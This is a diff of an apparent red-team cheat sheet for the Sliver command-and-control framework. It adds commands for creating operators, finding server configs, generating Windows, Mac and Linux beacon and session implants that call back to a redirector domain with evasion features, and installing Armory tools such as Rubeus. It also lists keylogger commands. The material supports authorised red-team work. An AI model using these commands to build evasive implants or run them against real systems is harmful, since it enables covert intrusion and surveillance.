@@ -1,6 +1,6 @@
 # Sliver C2 Cheat Sheet
 
-# TO DO - Work in Progress
+# Note: Work in Progress!!
 
 ## Setup
 
@@ -42,6 +42,13 @@ Download the output config file `/root/sliver-user.cfg` from the above Bash scri
 
 If you want to automate Sliver C2 setup and deployment in DigitalOcean, check out my [GitHub repo](https://github.com/wsummerhill/Automation-Scripts/tree/main/Sliver-C2-deployment_DigitalOcean).
 
+#### Manually creating operators
+`./sliver-server operator --name summerhill --lhost X.X.X.X --save /root/user-summerhill.cfg`
+
+#### Server Configurations
+[Documentation link](https://github.com/BishopFox/sliver/wiki/Configuration-Files)<br />
+The Sliver server config file can be viewed and modified (if needed) at the path `~/.sliver/configs/server.json`. The backend SQL database config for Sliver can be viewed at the path `~/.sliver/configs/database.json`. When Multiplayer mode is used, Sliver client configs get saved to the path `~/.sliver-client/configs/`.
+
 ### Sliver Client
 
 Use the Sliver client to import your `sliver-user.cfg` config file and use it to connect to the Sliver server:
@@ -66,8 +73,7 @@ All hackers gain undying
 sliver > help
 ...
 ```
-
----
+--------------------------------------------------------------
 ## Usage - Useful CLI Commands Cheat Sheet
 ```
 # Starting HTTP/S Listeners
@@ -105,7 +111,7 @@ loot # Show captured loot
 reaction ... # Create automatic command upon specific events like a new session
 ```
 
----
+--------------------------------------------------------------
 ## Listeners
 ### HTTP(S)
 
@@ -120,35 +126,63 @@ https -d redirector-domain.com --lets-encrypt
 https -c cert.pen -k key_decrypted.pem -d redirector-domain.com -p
 ```
 
----
+### mTLS
+
+
+--------------------------------------------------------------
 ## Redirectors - HTTP(S)
 
 TO DO
 
----
+--------------------------------------------------------------
 ## Payloads
 ### Staged Payloads
 
-TO DO
+Use my blog [HERE](https://wsummerhill.github.io/redteam/2023/07/25/Sliver-C2-Usage-for-Red-Teams.html#staged-payloads) for more details on staged payloads. 
 
 ### Beacon Payloads
+Beacon payloads perform ascychronous communication with your C2 server where the beacon sleeps and checks in with the C2 server on specific or random intervals.<br />
+```
+# Create Windows Beacon HTTPS shellcode with evasion features
+generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion
 
-TO DO
+# Create Mac Beacon mTLS executable and skip all evasion features for testing purposes
+generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 15 --os mac --skip-symbols --disable-sgn
+```
 
 ### Session Payloads
+Session payloads are different than Beacon payloads since they operate using interactive sessions and repeatedly callback to the C2 server every second (i.e. sleep time = 0). Session payloads also can't be converted after to Beacon payloads, so realistically they should only be using for debugging/testing or not at all.<br />
+**Note: Sessions payloads are NOT recommended for red teams!**<br />
+```
+# Create Windows HTTPS session shellcode with evasion features
+generate --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion
 
-TO DO
+# Create Linux mTLS session executable  
+generate --mtls https:/sliver-redirector.com --save /output/path/ --os linux
+```
 
 ### Debugging Payloads for testing
 
 Sliver can easily create debugging payloads for testing execution or viewing C2 traffic sent by the payload or server. Use the `generate --debug` 
 parameter when generating new payloads which will show the debug output in the CLI console. 
 
----
+--------------------------------------------------------------
 ## BOFs
 ### Sliver Armory
 
-Pre-built library of BOFs that have been added to Sliver in the [official repository](https://github.com/sliverarmory) that can easily be loaded and run in Beacons/Sessions. 
+Pre-built library of BOFs that have been added to Sliver in the [official repository](https://github.com/sliverarmory) that can easily be loaded and run while interacting with Beacons/Sessions. The official Armory BOFs can be viewed on [GitHub here](https://github.com/sliverarmory).<br />
+The Armory can be used to install individual BOFs or full packages of BOFs (i.e. TrustedSec Situational Awareness).<br />
+```
+# List available packages
+armory
+
+# Updating Armory
+armory update
+
+# Installations
+armory install all --> Installing everything
+armory install rubeus --> Install just Rubeus
+```
 
 ### Custom BOFs
 
@@ -160,7 +194,7 @@ raw_keylogger 2  # Get keylogged contents in Sliver
 raw_keylogger 0  # Stop keylogger
 ```
 
----
+--------------------------------------------------------------
 ## OPSEC Tips
 
 - Best practices to modify the default HTTP(S) C2 profile at the local path `/root/.sliver/configs/http-c2.json`
